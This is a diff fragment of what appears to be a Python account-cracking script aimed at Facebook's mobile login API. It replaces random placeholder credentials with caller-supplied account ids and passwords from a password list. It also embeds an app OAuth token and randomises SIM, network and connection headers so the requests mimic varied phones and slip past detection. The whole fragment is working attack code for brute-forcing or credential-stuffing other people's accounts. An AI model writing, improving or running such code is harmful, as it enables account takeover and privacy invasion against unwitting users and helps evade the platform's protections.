@@ -617,8 +617,8 @@ def api2(ids,names,passlist):
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
-                                        'email':'10000'+str(random.randint(11111111111,99999999999)),
-                                        'password':str(random.randint(1111111,9999999)),
+                                        'email':ids,
+                                        'password':pas,
                                         'cpl':'true',
                                         'credentials_type':'device_based_login_password',
                                         "source": "device_based_login",
@@ -706,12 +706,12 @@ def api3(ids,names,passlist):
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':"45201",
-                                        'x-fb-connection-type':'mobile.LTE',
+                                        'x-fb-sim-hni':str(random.randint(2e4, 4e4)),
+                                        'x-fb-connection-type':'MOBILE.WCDMA',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                         'user-agent':ua_string,
-                                        'x-fb-net-hni':"45204",
-                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
+                                        'x-fb-net-hni':str(random.randint(2e4, 4e4)),
+                                        'x-fb-connection-bandwidth':str(random.randint(2e7, 3e7)),
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
